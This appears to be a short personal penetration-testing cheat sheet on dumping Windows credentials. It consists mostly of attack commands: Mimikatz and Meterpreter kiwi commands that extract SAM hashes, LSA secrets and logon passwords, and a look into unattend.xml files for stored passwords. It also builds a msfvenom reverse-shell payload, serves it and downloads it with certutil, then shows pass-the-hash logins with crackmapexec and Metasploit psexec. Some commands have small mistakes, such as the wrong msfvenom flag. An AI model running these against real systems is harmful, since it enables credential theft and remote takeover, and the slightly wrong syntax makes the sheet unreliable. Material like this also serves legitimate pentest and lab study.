# Windows Credential Dumping

--------------------------------------------------------------------

## Password Hashes:

> two types of hashses LM (LanMan) and NTLM (uses MD4), being the last the latest

--------------------------------------------------------------------

## Mimikatz:

```
> Manual: 

upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords


>With Meterpreter:

pgrep lsass
migrate
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

```

--------------------------------------------------------------------

## Windows configuration files:

```
C:\Windows\Panther\Unattend.xml 

C:\Windows\Panther\Autounattend.xml 

msfvenom -f windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f exe > payload.exe
python -m SimpleHTTPServer 80
certutil -urlcache -f http://0.0.0.0/payload.exe
set multi/handler
if plain text is false —> the password is encoded in base64

[psexec.py](http://psexec.py) Administrator@0.0.0.0 
password
```

--------------------------------------------------------------------

## Pass The Hash:

> We can use the hash obtained before or the password obtained.

```
crackmapexec smb 0.0.0.0 -u Administrator -H “LM:NTLM”

Administrator:id:LM:NTLM

Administrator:LM:NTLM for logging


> With Metasploit:

exploit/windows/smb/psexec
set target native\ upload
set windows/x64/meterpreter/reverse_tcp

```

--------------------------------------------------------------------